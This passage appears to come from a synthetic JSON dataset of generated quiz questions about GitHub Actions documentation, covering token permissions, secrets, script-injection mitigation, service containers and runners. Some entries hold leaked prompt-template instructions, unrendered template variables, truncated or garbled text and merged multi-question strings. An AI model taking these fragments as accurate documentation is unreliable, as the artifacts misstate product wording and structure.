is an example of using it to create an issue using the REST API", "6f5cf2e3-cdfe-474d-bb85-7ac47e88d9cb": "What are the default permissions granted to the `GITHUB_TOKEN` by default, and how can they be set to be either permissive or restricted for an enterprise, organization, or repository?", "be29f708-defc-4cfb-9665-3ac6b1213021": "What actions, checks, contents, deployments, issues, metadata, packages, pages, pull-requests, repository-projects, security-events, and statuses does the GITHUB_TOKEN have access to when triggered by a public fork's pull_request_target event", "a6a932f1-c6b3-46bc-84dc-0a285127c578": "How can the permissions for the GITHUB_TOKEN be modified in individual workflow files, and what is the recommended security practice for granting the least required access to the token?", "6b5368ea-96df-48c2-9a3f-fc9cf6f6b14f": "What is the default setting for permissions for the `GITHUB_TOKEN` at the enterprise, organization, or repository level, and how can it be adjusted based on configuration within the workflow file?", "48064996-9082-4b79-8a8d-a200fe5dcc32": "How can the `permissions` key in a workflow file be used to modify permissions for the `GITHUB_TOKEN` in an entire workflow or for individual jobs", "157b4da6-3e21-4083-8afa-8775df825b82": "What is the purpose of creating a {% data variables.product.pat_generic %} and how can it be used in a workflow? Provide examples from the context information.2. How can I generate an installation access token within a workflow, and what is the alternative method mentioned in the context information? Explain the steps involved in both methods.", "aa6c5cec-d011-4b0a-824e-18d5913a9dec": "How can sensitive values be securely stored in workflow files using {% data variables.product.prodname_actions %}", "59ed33bb-0410-4b21-866d-10ad3891bb4a": "What measures can be taken to prevent accidental disclosure of secrets in run logs while using {% data variables.product.prodname_actions %}?", "54b91fdd-6aab-492a-9670-936b2a02f020": "How can you ensure that secrets are properly redacted in GitHub workflow logs, as described in the context information?", "92991cff-59ab-4260-a71c-da4785a86488": "What is the recommended approach for handling secrets in GitHub workflows, as outlined in the context information provided", "7125c036-80d3-4914-80a3-6d76a16814ef": "How can required reviewers be used to protect environment secrets in GitHub workflows, and what are the potential benefits of implementing", "a0e577ae-ff29-4e43-92bc-bada9a438f0a": "How can the `GITHUB_TOKEN` be managed to ensure it has the minimum required permissions, and what are the potential consequences of granting excessive permissions", "aba2a837-7ce8-4c3b-bfce-dfe8a3261b6e": "How can the `CODEOWNERS` feature be used to monitor changes to workflow files, and what are the potential benefits of implementing this practice", "d8f267f5-cf30-44a3-8b78-14ab5950c29a": "What is the recommended approach for auditing and rotating registered secrets in GitHub workflows, and how can it help reduce security risks", "fd685824-527d-4b1c-b8e3-c99c831eb2a5": "What is the recommended practice for managing secrets in GitHub workflows, and how can it help mitigate security risks", "06842988-8b58-4da6-9d9b-a70d50e19a1a": "What is the significance of the warning regarding user access to secrets in GitHub workflows, and how can least privilege principles be applied to mitigate this risk", "3f5775f4-72e8-41d4-968a-7bdb538f557c": "What are some less obvious sources of potentially untrusted input in {% data variables.product.prodname_actions %} workflows, and how can they be addressed to prevent script injection", "876975c1-a9c4-4ffa-82fb-634af896581f": "How can potentially untrusted input, such as branch names and email addresses, be mitigated to prevent script injection in {% data variables.product.prodname_actions %} workflows", "919d3256-1885-420c-af53-47e920de63f1": "Generate according to: Context information is below.---------------------ed as code which is then executed on the runner. Attackers can add their own malicious content to the `github` context, which should be treated as potentially untrusted input. These contexts typically end with `body`, `default_branch`, `email`, `head_ref`, `label`, `message`, `name`, `page_name`,`ref`, and `title`.  For example: `github.event.issue.title`,", "55696ff0-a4ed-4c2b-aeb7-9cb6203a3e27": "Generate according to: GitHub Actions workflows can be used to automate tasks, such as building, testing, and deploying code. They can also be used to perform security checks, such as scanning for vulnerabilities or checking for compliance with security policies.In this example, we'll create a workflow that checks the title of a pull request against a list of approved titles. If the title is not approved, the workflow will fail the pull request.The workflow is triggered when a pull request is created or updated.The `check-title` job runs a shell script that checks the title of the pull request against a list of approved titles.The `title` context value", "0ca1797e-35ff-47e9-88c4-ad305bf8576e": "How can script injection attacks be mitigated in GitHub Actions workflows", "86dca68b-6197-4674-97bf-4318f8024811": "What is the recommended approach for handling untrusted input in GitHub Actions workflows, and why is it preferred over inline scripts", "c3b50796-52f1-495a-b59f-37db402a8bbd": "What is the purpose of using starter workflows for code scanning, as outlined in the context information", "63838f5e-c885-4d62-a25f-fa8780675514": "How can context information be utilized to generate diverse questions for an upcoming quiz/examination", "ae51603e-df44-440b-94d9-fbff7161c2e9": "How can third-party actions be utilized in workflows, as described in the context information", "8f637afa-8259-4a24-be76-4b38dd4cebc8": "How can the value of the {% raw %}${ {% data variables.product.prodname_code_scanning_caps %}", "be93302b-7f67-4ce2-8003-3198eaced03d": "What are some recommendations for writing shell scripts that are specific to {% data variables.product.prodname_actions %} and how can they be applied to the script injection attempt mentioned in the context information", "cbdd49f8-8259-4e10-904c-f1489ae7ba08": "How can permissions be restricted for tokens to mitigate the risk of an exposed token, as mentioned in the context information", "d1f02f7a-dbe6-4740-b9c0-d3811776cd74": "What is the significance of using OpenID Connect to access cloud resources, as explained in the context information", "e7d9d2db-89a1-4a0f-a6e9-16dee46f7375": "How can the risk of sourcing actions from third-party repositories on GitHub be mitigated, and what are some recommended practices to follow in this regard", "a3482f40-58e6-4453-a4cb-9c36e02abf0d": "What is the significance of compromising a single action within a workflow, and how can this lead to the exposure of all secrets configured on a repository? Provide examples to illustrate your answer.", "b1c7fc5f-e7b2-4752-92fc-424817210e4b": "What is {% data variables.product.prodname_dependabot_version_updates %} and how can it be used to automatically update references to actions and reusable workflows in a repository", "062656fb-9ffd-4e1a-bd06-ab441d9366a6": "What is a scoped token in the context of {% data variables.product.prodname_actions %}, and how can it be used to grant specific permissions to workflows", "1cb24152-8d6e-4aab-a166-3ef0d7db57a4": "How can third-party actions and workflows be safely integrated into a repository, and what precautions should be taken to mitigate potential risks", "d2e1e683-c539-4ad8-ab87-03f74dc13ea7": "What is the difference between internal and private repositories in the context of {% data variables.product.prodname_actions %}, and how can outside collaborators access internal repositories", "aedf5581-d60a-4b98-b497-ef88229ab419": "How can workflows be configured to prevent them from creating or approving pull requests, and what are the potential security risks associated with allowing this functionality", "6e5e4349-5eda-4140-beba-7b5ffd4d3f1d": " What precautions should be taken to prevent the misuse of secrets in custom actions in {% data variables.product.prodname_actions %}", "73fc46c1-c197-4d25-b1fc-0072e691ba14": " How does the Scorecards action alert developers about risky supply chain practices in {% data variables.product.", "07168aa9-f97e-4c14-8aaa-aaef9edbf794": " How can OpenSSF Scorecards be utilized to enhance workflows' security practices", "674ecfe8-e946-435f-8275-b5befe936aa9": " How does the Scorecards action and starter workflow help in following best security practices in {% data variables.product.prodname_actions %}", "eecd35fb-7bde-402a-9623-1ffe8b1fd886": " What are the potential impacts of a compromised runner on {% data variables.product.prodname_actions %}", "cf61bd23-9425-476b-8747-9658c24ab411": " How does the accessibility of secrets differ for various event triggers in {% data variables.product.prodname_actions %}", "008f70ed-0e3c-4912-b157-5fcf7c7bbf09": " What types of risky supply chain practices does the Scorecards project check for in {% data variables.product.prodname_actions %}", "22eb24de-3429-4ba1-a55c-81cc28232eee": "How does the rodname_actions feature in {% data variables.product.prodname_actions %} help prevent accidental secret disclosure", "48d4bf39-673c-4396-a75f-3dd94344dfc4": "What is the limitation of the {% data variables.product.prodname_actions %} runner's generated GITHUB_TOKEN, and how can an attacker exploit it?", "052985ba-0f35-47ce-a8f7-893bb8a50808": "How can deploy keys be used to interact with another repository within a workflow, and what are the limitations of using deploy keys for this purpose?", "40c82f6f-575e-490c-99e2-6dee4b9a8295": "What is the recommended approach for accessing repository data within a workflow, and why should the `GITHUB_TOKEN` be used whenever possible", "6e0891b1-b088-4de0-9c3c-7904e3ee5e60": "What are the recommended authentication methods for interacting with GitHub's REST or GraphQL API, and which ones should be avoided due to potential access issues", "213511b9-215d-4447-84c6-4c10f8adbbe8": "What are the potential drawbacks of using a personal account's SSH keys or a {% data variables.product.pat_v1 %} in workflows, and what alternatives should be considered instead?", "b2ca0fab-1c5d-414d-bac3-33fac77ba6bb": "What is the significance of indirectly granting broad access to all write-access users of a repository through the use of SSH keys in the context of GitHub Actions", "7beb7856-b313-4074-b967-d0a217690c5e": "How can an SBOM be utilized to mitigate security risks associated with {% data variables.product.prodname_dotcom %}-hosted runners, and where can it be found?", "d1091ef4-898a-4f96-b75b-fc7a53b9fabd": "How can the scope of a compromise be reduced when using self-hosted runners on {% data variables.product.product_name %}?", "1bc1b117-5e5c-40a7-a02e-91e94ebbee57": "What are the risks associated with using self-hosted runners for public repositories on {% data variables.product.product_name %}", "a5b99997-2369-4a28-9dd5-22bb38d3a0af": "What are the risks associated with storing sensitive information on self-hosted runners in {% data variables.product.prodname_dotcom %}, and how can these risks be mitigated?", "bf5fbad4-fe69-451e-8ce0-4ed3a75e5701": "How can the use of just-in-time runners improve runner registration security in {% data variables.product.prodname_dotcom %}", "010d83c3-0c46-4389-93c2-1ab9a49fd147": "How can I manage runners for my GitHub Actions workflows, and what are the benefits of centralized versus decentralized management? Provide specific examples and considerations for each approach.2. What is OpenID Connect and how can it be used to authenticate to cloud providers and manage secrets in GitHub Actions? Compare and contrast this approach with other methods of authentication and secret management, and discuss the advantages and disadvantages of each. Provide real-world examples and best practices for implementing OpenID Connect in GitHub Actions.", "36fe8189-3a58-4942-aa87-aaf15aadee38": "Given the context information and not prior knowledge.generate only answers based on the below query.You are a Student. Your task is to answer EXACTLY 2 questions for an upcoming quiz/examination. The questions should be diverse in nature across the document. Restrict the answers to the context. Answers should be clear and concise.Don't hallucinate.answers:1. To set up an \"", "1df09679-038a-48eb-a1ab-1e3aea792bbf": "What are the differences in setting up an \"AUTOTITLE\" for each account type in GitHub Enterprise Server (GHES), GitHub Advanced Security (GHAS), and GitHub Enterprise Cloud (GHEC)", "12072f57-277a-4f70-af7f-9599b893ff4b": "How can I set up an \"AUTOTITLE\" for each account type in GitHub Enterprise Server (GHES), GitHub Advanced Security (GHAS), or GitHub Enterprise Cloud (GHEC)", "1687ce12-96a3-4f15-ac37-32e7bb3c664d": "Generate according to: Context information is below.---------------------About secretsSecrets are variables that you create in an organization, repository, or repository environment. The secrets that you create are available to use in {% data variables.product.prodname_actions %} workflows. {% data variables.product.prodname_actions %} can only read a secret if you explicitly include the secret in a workflow.For secrets stored at the environment level, you can enable required reviewers to control access to the secrets. A workflow job cannot access environment secrets until approval is granted", "dd341023-cc02-4ec6-9078-49a0943653c0": "What are secrets in the context of {% data variables.product.prodname_actions %} and how are they created and accessed", "06a58bc9-c9d5-4789-ba91-98e2af7fc75d": "What are the rules for naming secrets in {% data variables.product.prodname_actions %} and how does precedence work for secrets with the same name at different levels", "71a4d401-a823-43b6-913c-5529ecb1a03e": "What is the name of the feature that allows for fine-grained permissions and short-lived tokens when using a", "206ee8d4-be31-46b2-b6a5-040e5e985e0e": "What tab should be accessed in the repository settings to manage secrets and variables using the web interface", "cd882dae-e5fc-448a-b05b-dd06758ab29b": "What is the difference between using a {% data variables.product.pat_generic %} and a {% data variables.product.prodname_github_app %} when managing secrets", "321c5173-9963-453d-8718-6fdf5d782bd0": "How can organization and repository secrets be managed to limit credential permissions", "9b4e67b8-c4e2-4092-95f7-8cf15be1af67": "How can the minimum permissions necessary be granted when generating a {% data variables.product.pat_v1 %} or {% data variables.product.pat_v2 %}", "761b079c-9847-4e95-b8a9-5e2b47c67e73": "What alternatives to personal credentials should be considered when generating credentials", "40ecfa28-361c-4655-a74c-06c70a65e142": "Who has the ability to manage secrets for a repository using the REST API", "aa33198d-bef6-4a5b-b508-090fd3b22b2d": "How can secrets be created for a repository using the web interface", "8f8a8b6f-5730-499e-8554-b03f383a96e3": "How can repository secrets be added in GitHub using the CLI", "5c58ebb8-6363-4a1e-b683-5a5f6127252b": "Given the context information and not prior knowledge.generate only answers based on the below query.You are a Teacher/ Professor. Your task is to provide EXACTLY 2 answers for the questions asked in the previous instruction. The answers should be diverse in nature across the document. Restrict the answers to the context. Answers should be understandable without having access to the context.Don't hallucinate.answers:1. To add a repository secret in GitHub using the web interface, follow these steps:   1. Go to the repository for which you want to add a secret.   2. Click on the settings icon in the top-right corner of the page.   3. Select", "95a030d3-2b32-484f-acf0-a5894779262f": "How can repository secrets be added in GitHub using the web interface", "159afd6d-fd07-426c-943f-77b00b399b5a": "Generate according to: {% cli %}{% note %}**Note:** By default, {% data variables.product.prodname_cli %} authenticates with the `repo` and `read:org` scopes. To manage organization secrets, you must additionally authorize the `admin:org` scope.```shellgh auth login --scopes \"admin:org\"```{% endnote %}To add a secret for an organization, use the `gh secret set` subcommand with the `--org` or `-o` flag followed by the organization name.```shellgh secret set --org ORG_NAME SECRET", "4d9610b1-08b4-40a1-8179-22c5885fd850": "How can I check which access policies are being applied to a secret in my organization using the GitHub CLI", "357c5316-8f98-4a85-bcb3-c8c03ebbb5ee": "How can I add a new organization secret using the GitHub CLI", "4438ca9d-ee2f-47b2-ae1c-79c1b0b8f080": " How can secrets be accessed in a workflow using the `secrets` context? Provide an example of how to set a secret as an input or environment variable.- What should be avoided when passing secrets between processes, and how can secrets be protected when passing them within a command line? Provide an example of how to escape special characters in a secret when passing it within a command line.", "c9fb1b91-9ef1-4b9d-9512-cbeaadd8cddc": "How can secrets be stored in GitHub and what are the limits for doing so", "cfc248b3-d9b0-46bf-aba7-0e4473be6d93": "What is the workaround for storing large secrets on GitHub and what precautions should be taken while using it?", "5695bce1-66a1-4cdb-b896-a655d70ecc90": " How can I decrypt an encrypted file using a shell script in GitHub?", "232860c1-5c5a-4a34-9f97-e9714423092a": " How can I create a new secret on GitHub that uses a passphrase as the value", "5dda88bc-294a-4ce9-bdb2-fed5e6310d21": "What is the recommended way to access Base64 strings from a runner in GitHub Actions, and how can they be decoded?", "fa197564-69fa-4bc7-8a38-80142c8c57e3": "How can Base64 encoding be used to store small binary blobs as secrets in GitHub", "e80ed30f-81bb-4fad-b0fb-c43e9a1ac7a7": "What security measure can be taken to prevent sensitive values being leaked from workflow run logs in {% data variables.product.prodname_dotcom %}?", "503d3656-32de-482a-b7fe-d37ef192a1dc": "How can secrets be redacted from workflow run logs in {% data variables.product.prodname_dotcom %}", "e306815f-2a3e-4991-b8e5-bfadaea3abe7": "What are service containers and how do they simplify network access for running jobs in a container", "a07b78a2-f75d-497d-9f67-c1b71985a86c": "How does {% data variables.product.prodname_dotcom %} connect service containers to a job when running in a container, and what is the default network behavior for service containers?", "ae896d11-17c8-4e50-b525-f11243a27589": "How can service containers be created in a job using the `services` keyword in a workflow? Provide an example from the context information.2. What is the purpose of mapping ports on the Docker host and service container in a job that runs directly on the runner machine? Provide an explanation using the given context.", "0c91c802-90e5-4f1f-b64c-a74fd62bc1fc": " How does {% data variables.product.prodname_dotcom %} publish container ports using the `ports` keyword during service container mapping", "176e10c7-384c-4a5d-a9af-3abbc8acfd4f": " What happens when a Docker host port is specified but the container port is not during service container mapping on {% data variables.product.prodname_dotcom %}? Provide an example and explain how to access the corresponding container port using context.", "e6227c37-337b-4491-987d-0ea57f4c5158": " How does the Docker Hub `postgres` image differ from other Docker Hub images in terms of functionality and usage? Provide specific examples to support your answer.- What is the purpose of setting health checks for the `postgres` service container in the workflow example provided? How does it ensure the container is ready to use?", "b775ef0c-4c8f-431f-916d-7e73f334d3bb": " What is the purpose of the `services` section in the `container-job` configuration, and how is the `postgres` service accessed within the `container-job` steps?", "c2c16471-fc4f-46a4-a251-12996b73fbac": " How can environment variables be used in the `client.js` script to create a new PostgreSQL table, and what are the specific values assigned to the `POSTGRES_HOST` and `POSTGRES_PORT` variables", "56a85731-0386-441f-a70d-9e1585d18524": " How can I access the PostgreSQL service container from the Docker host, and what port should I use", "6beb2a5e-e9db-440e-8030-689cd4c06879": " What environment variables are used by the `client.js` script to create a new PostgreSQL client, and what values do they hold in this context?", "5c111e40-eff8-4aa3-b8b9-9a62fb40b284": " How does the `services` keyword in the `jobs` section of the workflow file allow for the use of service containers in GitHub Actions", "7a6ec6e2-f90f-43c7-aa13-197f3707d2a5": " What is the purpose of the `env` keyword in the `services` section of the `jobs` section of the workflow file, and how is it used to provide environment variables to the service container?", "cac47945-ea95-4bea-90ac-38451e6860cc": "How does the script in the provided context information connect to the PostgreSQL service container and what operations does it perform on the database", "2d9d1c99-3a1f-45c8-8791-23d06643b6f3": "What environment variables are used by the script to connect to the PostgreSQL service container and what values do they hold?", "65bb8bb5-65d2-41de-b965-deba8db529b0": "What is the purpose of the `values` parameter in the second `query` function, and how is it used to pass data to the query?", "4b293488-2d53-4dfc-9351-76f46e2ceb59": "How does the script create a new connection to the PostgreSQL service and what environment variables are used to specify the IP address and port", "bca6d1a4-37d5-46ba-bff7-3af67576d8fe": " How can I configure a service container using the Docker Hub `redis` image in a workflow that runs a script to create a Redis client and populates it with data", "0af624fe-32a9-45a0-b97a-ee0183aeb5a5": " What is required to run jobs in containers in {% data variables.product.prodname_actions %} and what is the label used to access a service container?", "0fb518b0-e7f9-41b1-8ea1-d0f0e22a37e7": "What is the default Redis port that is used to communicate with the Redis service container, as mentioned in the context information?", "37314981-fd92-4536-993f-9ff57e6aac83": "How can the environment variable REDIS_HOST be utilized in the script \"client.js\" to establish a new Redis client", "a784d76f-7417-455f-a2b8-b4c22c5b48cf": " What is the label used to access a service container in a workflow, and how can I map ports between the service container and the Docker host when running a job directly on the runner machine?", "26f5822e-cf54-4aab-8e14-e1260ff6b7c9": " How can I access a Redis service container from the Docker host using localhost and a specific port number", "90bcf3b1-75ac-4d9e-855a-53bcd157b265": " What is the purpose of setting health checks for the Redis service container, and how do we do it in the context provided?", "f98d6fdb-a1ae-4d63-ac57-fef3efa08724": " How can we configure the runner job to utilize the Redis service container in our workflow", "4d7e34f5-11b8-4fbd-9ee2-f6aacd566aef": "How can I test the Redis service container using Node.js and the `redis` npm module", "2b253b52-337d-4162-bec5-34301d9257bf": "What is the purpose of setting a key to \"species\", field to \"octocat\", and \"value\" to \"Cat and Octopus\" in the Redis service container?", "f01e05b9-9b0e-4a3b-a1b5-1e0302f5c80e": "What is the purpose of the `hset` method in the script?", "e505f1e1-4e54-42d9-b8cc-8c40e870e097": "How does the provided script interact with Redis", "a3719479-c722-45ee-9ce2-89740afde7c6": "Generate according to: Overview of {% data variables.product.prodname_dotcom %}-hosted runnersRunners are the machines that execute jobs in a {% data variables.product.prodname_actions %} workflow. For example, a runner can clone your repository locally, install testing software", "80800fa8-7ad0-4e36-88f8-485b1d173e2c": "What is a runner in the context of {% data variables.product.prodname_actions %} workflows, and how does {% data variables.product.prodname_dotcom %} provide runners for executing jobs", "c9ea79b1-69b6-4109-b6f3-32c8d2aeffa0": "What are the benefits of using a {% data variables.product.prodname_dotcom %}-hosted runner for executing jobs in a {% data variables.product.prodname_actions %} workflow, and how does {% data variables.product.prodname_dotcom %} handle machine maintenance and upgrades for these runners", "b712633f-7645-4288-97c2-43d24fca6e77": "What is the difference in the `runs-on:` specification for the jobs named `Run-npm-on-Ubuntu` and `Run-PSScriptAnalyzer-on-Windows` in the provided workflow?", "31975fd9-181e-420b-937c-e876609c142b": "How does the workflow in the provided context demonstrate the execution of two jobs on different runners", "fcef0281-871b-4fcf-9916-7b5c21e62c3a": "What is the purpose of reviewing the list of available GitHub-hosted runners for a repository, and how can a runner label be copied for future use", "95067c94-7b9f-4869-b198-45d8f30c4e1a": "What types of software tools are included in GitHub-hosted runners, and how can I access a list of preinstalled tools for a specific runner operating system?", "db7f5b30-4042-465b-acc7-288b0a4837ea": "What benefits do I get by using actions to interact with the software installed on runners instead of directly using preinstalled software on {% data variables.product.prodname_dotcom %}-hosted runners?", "cbcdc0cf-8f46-420f-8387-1a1b0031e57f": "How can I access and view a software bill of materials (SBOM) for each build of the Windows and Ubuntu runner images on {% data variables.product.prodname_dotcom %}-hosted runners", "935f8920-7369-47e8-9ba5-09ea5ab489c7": "What is the significance of the statement \"Administrative privileges\" in the context provided? How does it differ from regular user privileges? Provide examples to support your answer.2. What is the purpose of the \"etc/hosts\" file mentioned in the context? How does it affect the execution of actions and shell commands on the virtual machine? Provide instructions on how to access and modify this file.", "8544a380-fdb4-42cc-af28-c76cecdf9db7": "What is the purpose of the `home`, `workspace`, and `workflow` directories in {% data variables.product.prodname_dotcom %}? Provide a detailed explanation of the role each directory plays.2. How does {% data variables.product.prodname_dotcom %} handle the `workflow/event.json` file during workflow execution? What is the significance of rewriting this file each time an action executes?", "4f47f134-ef66-47fd-951c-5ea1f5e39901": " How can I install software on Ubuntu runners using GitHub Actions? Provide an example YAML configuration.- How can I install software on macOS runners using GitHub Actions? Provide an example YAML configuration.- How can I install software on Windows runners using GitHub Actions using Chocolatey? Provide an example YAML configuration.", "d870ced8-2ee4-4bb2-9ef1-92a63ea83927": "How can I check the maximum number of concurrent jobs I can run on {% data variables.product.prodname_dotcom %}-hosted runners?", "2dd18b67-647d-4024-9c75-645301641470": "How can I view a list of all jobs currently running on {% data variables.product.prodname_dotcom %}-hosted runners in my organization or enterprise", "fec459a2-7c28-4046-bb66-b8aa42abd5ea": "What are the differences in features available for {% data variables.actions.hosted_runner %}s with macOS, Ubuntu, and Windows operating systems", "152c61bb-f997-4e97-a270-8f6e2a45e2c5": "How do Ubuntu and Windows {% data variables.actions.hosted_runner %}s differ from macOS {% data variables.actions.hosted_runner %}s in terms of autoscaling capabilities and IP address management?", "ce8f9f16-f115-4783-b9f0-67bc570c55a3": "What limitations are present for macOS {% data variables.actions.hosted_runner %}s, and how can I ensure that all actions provided by {% data variables.product.prodname_dotcom %} are compatible with arm64 runners?", "4db9cc25-2a9a-44ef-abb0-5d77ee5ce88b": "What are the differences in hardware specifications between the Large and XLarge macOS {% data variables.actions.hosted_runner %}s, and which one is recommended for running community actions that are not yet compatible with arm64", "80c818b0-31e7-402c-a65b-cebfd803ddce": "How does autoscaling of {% data variables.actions.hosted_runner %}s enable concurrent workflows, and what is the maximum limit that can be set by the user", "f4cfde45-eee6-422b-955c-6c3dda0b4be3": "What machine sizes are", "0c8efc25-d6bd-4159-9993-8838cf9b2635": "What are the benefits of assigning static IP addresses to {% data variables.actions.hosted_runner %}s from a specific range, and how can this be used to configure a firewall allowlist", "c1bb9c60-ce8f-4762-b243-2a48ece4d68e": "How can the use of hardware acceleration for the Android SDK tools in {% data variables.actions.hosted_runner %}s enhance CI/CD pipelines for Android tests", "94850b6b-d501-4ab7-af6e-d0c0d6f84428": "What is the difference in billing for {% data variables.actions.hosted_runner %}s compared to standard {% data variables.product.prodname_dotcom %}-hosted runners, and how does this apply to private repositories", "c2650d77-6dee-49f4-8440-7d67e0f20258": "How many different operating systems are listed in the context information, and what are their respective storage capacities", "747290cd-77ac-49b3-8eb1-c25ff3b669a4": "What is the difference in storage capacity between the operating systems with 12 and 16 GB, respectively", "189e9138-e5e8-464b-adb2-cada7d25aa59": "Which operating systems can be assigned to runner groups, and what is the purpose of runner groups in this context", "93aad1c1-aaed-42c6-b34a-d0be8ea5d190": "How does the architecture of {% data variables.actions.hosted_runner %}s with Linux or Windows operating systems differ from other types of runners, and what is the role of {% data variables.actions.hosted_runner_caps %}s", "b7490b7d-41da-43b6-8509-507cd97c8542": "What is the default group for newly deployed runners, and how can this be changed during the deployment process", "e10603cf-97be-4c09-b78c-00f8c58062f7": "How can administrators control access to runners using runner groups, and which types of organizations or repositories can be permitted to run jobs on these sets of machines", "3cd83df7-22a2-4ed4-bde6-415147899714": "How can context information be utilized to generate diverse questions for an upcoming quiz/examination", "97a52383-1ae9-4e19-94ed-1991117ee388": "Can you provide an example of how context information can be used to restrict questions to a specific topic or theme", "518841cd-6b59-408c-baba-d219273d13d3": "What is the limit for the number of {% data variables.actions.hosted_runner %}s with static IP address ranges that can be used in total across all runners, and how does this limit differ for runners created at the enterprise and organization levels? What should be done if runners are unused for more than 30 days?", "fbff33f2-6c65-4ee0-b005-025d5affc913": "How can {% data variables.actions.hosted_runner %}s receive a static IP address, and what benefits does this offer in terms of firewall configuration", "7a860eec-abf3-4ee4-a6bd-85dc5f9ca1da": "How can access to a runner group be managed at the enterprise level and at the organization level?", "dea44adb-bf8d-4853-af63-ce9e396d1127": "What is the purpose of runner groups in the context of GitHub Actions", "46539625-df68-4283-9310-a81b573b70bd": "How can I change which workflows can access an organization runner group", "73898cce-8bc1-4e75-a680-1bb0d6181cbe": "How can I rename an enterprise runner group", "6674cd5a-2af7-4699-8660-678053ddb53e": "Changing the name of an enterprise runner group{% data reusables.actions.runner-groups-enterprise-navigation %}{% data reusables.actions.renaming-a-runner-group %}Changing the name of an organization runner group{% data reusables", "83f4bb8f-ebf3-488f-8b6f-95cb7d17306f": "How can I configure private network access for larger runners if my enterprise is connected to an Azure VNET", "c92c7e2a-1b64-4cfb-8684-f6233864395e": "How can I change which organizations in an enterprise can access a runner group", "78a38d28-85b5-41d4-95b5-7b1619d64566": "How can I rename an organization runner group", "cf0d1cb9-27d8-4ecd-9cfe-aa30c5e2a532": "How can I change which repositories in an organization can access a runner group", "fef7e779-d317-4826-8623-e3261980f420": "How can I change which workflows can access an enterprise runner group", "5d164636-d653-4bd8-b853-5d99b9409266": "How do I move a runner to a group in GitHub Actions", "a7183050-76e2-4c58-9554-8737c62d3770": "What is the purpose of moving a runner to a group in GitHub Actions", "5798dac8-1fd4-46bc-847a-d3af75a535f4": "How do I remove a runner group in GitHub Actions for an organization versus an enterprise", "16f41786-bf19-4e02-947d-33c43087ca3d": "How do I remove a runner group in GitHub Actions", "e540acda-7cac-4b13-b2b7-febde88837dc": "How do I move an organization runner to a group in GitHub Actions", "29d41521-ccef-4f57-9ba2-15e61c085c41": "What is the purpose of removing a runner group in GitHub Actions", "3e376cdf-c9e5-47ec-8876-6e0ebcc1581e": "How can I change the name of a runner group in GitHub Actions", "f5be82b6-8d4a-4fac-a753-d63400dba5aa": "How can I access the runner groups in GitHub Actions for an organization versus an enterprise?", "a20c3f80-80e7-4612-88f6-b798a145528d": "What is the difference between changing the name of a runner group in GitHub Actions for an organization versus an enterprise", "010371d9-d55f-470c-b83d-6e818ceab59c": "How do I move an enterprise runner to a group in GitHub Actions", "77f9d36b-fb42-423f-9251-e82e767d2a1f": "What is the default behavior when a hosted runner is created for an enterprise, and how can an organization owner limit access to specific repositories using a runner group?", "2a6ff59a-831d-4df3-bd9e-41f3f973b19e": "How can an enterprise owner add a hosted runner to their organization and grant access to specific repositories", "420a7dd0-ff85-43e4-97de-c7e6d71a0e98": "How can repositories gain access to hosted runners, and what are the different types of runner groups available for this purpose", "f23e48fa-8019-4827-b238-d3c5705068d7": "What is the difference between enterprise-level and organization-level runner groups, and how can organization owners manage access to hosted runners for their repositories using these groups?", "dc87c369-3787-4242-aca8-220f3ca86cbc": "How can I change the name of an organization runner in GitHub Actions? Provide step-by-step instructions including the necessary navigation and settings required to complete this task.2. How can I configure autoscaling for a specific runner set in GitHub Actions? Again, provide detailed instructions on how to access the necessary settings and configure the autoscaling feature.3. How can I create static IP addresses for GitHub Actions runners? Please provide clear and concise instructions on how to set up this feature, including any necessary prerequisites or configurations.4. How can I manage and monitor the performance of my GitHub Actions runners? Please provide guidance on how to access and interpret the relevant metrics and analytics, as well as any best practices for optimizing runner performance.5. How can I troubleshoot common issues with GitHub Actions runners, such as connectivity problems", "b9838990-7e68-4506-a399-871ddcfea2bd": "How can I enable static IP addresses for {% data variables.actions.hosted_runner %}s in {% data variables.product.prodname_ghe_cloud %}", "89b09360-0e94-4f78-9a96-bfe07e88ac93": "What is the difference between creating static IP addresses for organization runners and creating static IP addresses for enterprise runners in {% data variables.product.prodname_ghe_cloud %}?", "dc5a490c-9841-4db0-8cfb-b6dcf69c5aff": "How can I run jobs on larger runners provided by {% data variables.product.company_short %} for my workflows", "54e84998-3a7f-4533-b3fa-38e9e12e2fba": "What labels should I use in my workflow YAML files to run jobs on macOS runners provided by {% data variables.product.company_short %}?", "100e2d59-954b-47ba-9801-e463fbba0e2b": " How can I control where jobs are run using groups or labels in GitHub Actions? Provide an example using either groups or labels.- How can I target macOS hosted runners in a GitHub Actions workflow? What labels should I use for this purpose?", "6cca633d-626d-43ec-84a2-bce72776ebb2": "How can labels and groups be used to control where jobs are run in GitHub Actions? Provide an example from the context information.2. What troubleshooting steps should be taken for larger runners on Linux and Windows, as outlined in the context information?", "b6d80671-d77e-4b57-b403-a368aae749d4": "How can I configure private networking for my {% data variables.product.prodname_dotcom %}-hosted runners using an API Gateway with OIDC", "399e4f8f-07e4-43d5-aaad-8f9209596bf2": "[Optional] If you have prior knowledge, you may also generate a third question based on the context information provided.3. How can I utilize Azure Virtual Network (VNET) for private networking with {% data variables.product.prodname_dotcom %}-hosted runners? (if you have prior knowledge)[Optional] If you have prior knowledge, you may also generate a fourth question based on the context information provided.4. Compare and contrast the implementation process and benefits of using an API Gateway with OID", "10341863-3af0-4673-acbd-6b4139e40ff6": "What are the advantages and disadvantages of using WireGuard to create a network overlay for private networking with {% data variables.product.prodname_dotcom %}-hosted runners", "5dc024c0-48f9-48de-84ad-43ae8cc62a9d": "How can an API gateway with OIDC be utilized to securely access services in a private network from a GitHub Actions runner? Provide a detailed explanation of the architecture and advantages of this approach.2. What are the main disadvantages of using an API gateway with OIDC to access services in a private network from a GitHub Actions runner, and how can OIDC claims be utilized to ensure that only expected workflows are able to access these services? Provide specific examples and references to relevant resources.", "ac668861-e662-47a8-ae94-32f836a8ccde": " How can WireGuard be used to create a network overlay, and what are the advantages and disadvantages of this approach", "10dbe498-9973-4d10-af71-d1cd186ccd53": " Provide an example of configuring WireGuard to connect to a private service, including the necessary configuration for both the WireGuard instance running in the private network and the WireGuard instance in the {% data variables.product.prodname_actions %} runner.", "ff2cbb55-4178-4b9a-804e-eee86e8392ac": "How does NAT traversal differ in WireGuard and Tailscale, and why is it an advantage for Tailscale?", "af29fe75-8324-40a8-be38-326b6cde1b9c": "What is the purpose of generating and securely storing keys in the context of WireGuard and Tailscale", "ef1283a6-8218-44db-af1b-0db15e21ab7a": "Can I specify `permissions` at the top level of a workflow in GitHub Actions to apply to all jobs", "0e339581-e034-488f-9c90-75976934cd7c": "How can I change the 